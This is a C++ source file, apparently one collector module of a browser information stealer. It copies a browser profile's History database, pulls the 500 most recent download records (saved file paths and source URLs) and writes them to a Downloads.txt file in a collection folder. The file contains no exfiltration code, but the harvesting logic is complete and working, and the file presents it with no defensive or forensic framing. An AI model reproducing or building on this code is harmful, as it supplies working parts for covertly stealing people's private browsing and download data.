//
// Created by .1qxz on 08.06.2024.
//

#include "CDownloads.h"

void CDownloads::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->getProfileDir(browser_root) / "History";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<Download> history = CDownloads::getDownloads(copied_db);

    fs::remove(copied_db);

    if(history.empty())
        return;

    std::stringstream ss;

    for(Download &row : history)
        row.write(ss);

    Utils::writeFile(root / "Downloads.txt", ss.str(), true);
}

std::list<Download> CDownloads::getDownloads(const fs::path &db_path) {
    std::list<Download> downloadList;
    sqlite3* db;
    sqlite3_stmt* stmt;
    int rc;

    rc = sqlite3_open(db_path.string().c_str(), &db);
    if (rc) {
        return {};
    }

    const char* sql = "SELECT current_path, tab_url FROM downloads ORDER BY start_time DESC LIMIT 500";
    rc = sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);
    if (rc != SQLITE_OK) {
        {}
        sqlite3_close(db);
        return downloadList;
    }

    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
        const unsigned char* target_path = sqlite3_column_text(stmt, 0);
        const unsigned char* tab_url = sqlite3_column_text(stmt, 1);

        Download downloadRecord;
        downloadRecord.saved_as = std::string(reinterpret_cast<const char*>(target_path));
        downloadRecord.url = std::string(reinterpret_cast<const char*>(tab_url));

        downloadList.push_back(downloadRecord);
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);

    return downloadList;
}
